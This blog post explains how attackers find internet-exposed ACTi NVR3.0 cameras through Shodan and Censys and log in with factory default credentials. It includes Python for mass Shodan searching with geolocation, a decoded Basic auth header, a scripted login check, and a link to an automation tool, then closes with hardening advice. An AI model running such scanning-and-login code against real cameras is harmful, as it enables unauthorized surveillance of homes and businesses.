---
title: "The Hidden Risks of Poorly Secured Security Cameras"
description: "Discover how easy it is for attackers to find and exploit cameras that are connected to the internet."
pubDate: "16 May 2024"
heroImage: "/blog-placeholder-1.jpg"
tags: ["Cyber Security", "IOT", "Python"]
---

We all know that leaving default passwords active is a bad idea, but it can be even more risky on
security cameras. With such a simple oversight you are allowing intuders into your home or business
and loosing all privacy.

Despite this being such an easy fix (just change the password!), many people end up skipping this step.
This results in their "secure" cameras becoming easily exploited by attackers.

> The information below is intended for educational purposes only. Never attempt to access any computer
> system without explicit permission.

## How Attackers Find Exposed Cameras

Using powerful search engines like Shodan and Censys, it makes finding interent connected devices
trivial. Unlike your regular seach engine (eg google), these search engines are used to find
IOT devices, meaning any device connected to the internet. We can utilize these to search for
**ACTi NVR3.0 devices** - a popular camera. If we use Censys to search for the term "NVR3.0"
we can see 1000s of results are returned.

Once these cameras have been located, an attacker can manually attempt to login to each one
using the factory default credentials (admin/123456). These factory defaults are often left
enabled as people will not change them.

But why do this manually when it can be automated?

## Automating the Search

Shodan and Censys both provide convient APIs to search through their databases. The API will return
detailed data including: IP, open ports, latitude, longitude, etc. Using this data makes searching
easy. Here is a simple Python script to demonstrate how the Shodan API can be used:

```python
api = Shodan(config.SHODAN_API)
search_term = 'http.html:NVR3.0'

count = api.count(search_term)['total']
for page in range(math.ceil(count/100)):
    query = api.search(query=search_term, page=page+1)
    for server in query['matches']:
        param = f"{server['ip_str']}:{server['port']}"
        location = server["location"]
        start_thread(param, "SHODAN", location["city"], location["country_name"], location["country_code"], location["longitude"], location["latitude"])

```

## Inspecting and Exploiting

Once an attacker finds a camera they are able to attempt to login. We can use tools
like Burp suite to log all HTTP requests that the browser makes and inspect the data.
When logging in we can observe a header that gets sent:

```
Authorization: Basic YWRtaW46MTIzNDU2
```

We are able to decode this base64 string to inspect the data:

```sh
$ echo YWRtaW46MTIzNDU2 | base64 --decode                                                                                                                          2ms
# admin:123456
```

The decoded string includes the username and password that we entered in the login
page. With this information an attacker can programatically attempt to login:

```python
r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
if(r.status_code == 200):
  print("Login success")
```

We can just check the response from the login requests and check it matches the
status code "200" (meaning successful login). At this point an attacker can then
login to the camera and view it. I've put together a script that will
automate the whole process - avaiable on my [GitHub](https://github.com/member87/cam-finder)

## What Can Attackers Access?

Once logged in as an admin, the attacker will have full control over the cameras. This includes:

-   **Live Viewing & Playback**: Watch the cameras in real time and previous historical recorings.
    If the camera also has audio support, they would also be able to hear conversations.
-   **Camera Management**: Rename, delete, and confiure camera settings.
-   **Storage Control**: Delete previous recordings and reserve all disk space to prevent any
    new recordings
-   **Camera Direction**: There are a few models of cameras that will allow you to rotate the
    position, potentially watching sensitive areas.
-   **User Management**: Add, delete, or modify user accounts.

## Potential Impact of Poor Security

The implications of a compromised camera system are shocking. A bad actor could use this access
for anything from petty vandalism to a physical break-in—then delete the evidence. At the time of
writing, I’ve identified over 600 exposed cameras, many in homes and businesses.

## How to Secure Cameras (or anything IOT)

-   **Defualt Passwords**: Any password that comes defualt with your device should
    be changed as soon as possible.
-   **Limit Internet Exposure**: Don't make your devices avaible publically on the
    internet unless absouletly required. In these cases there should be sufficent
    security measures in place preventing public access.
-   **IP Whitelist or VPN**: If you need remote access, limit which IPs can have access
    or use a VPN to securly connect.
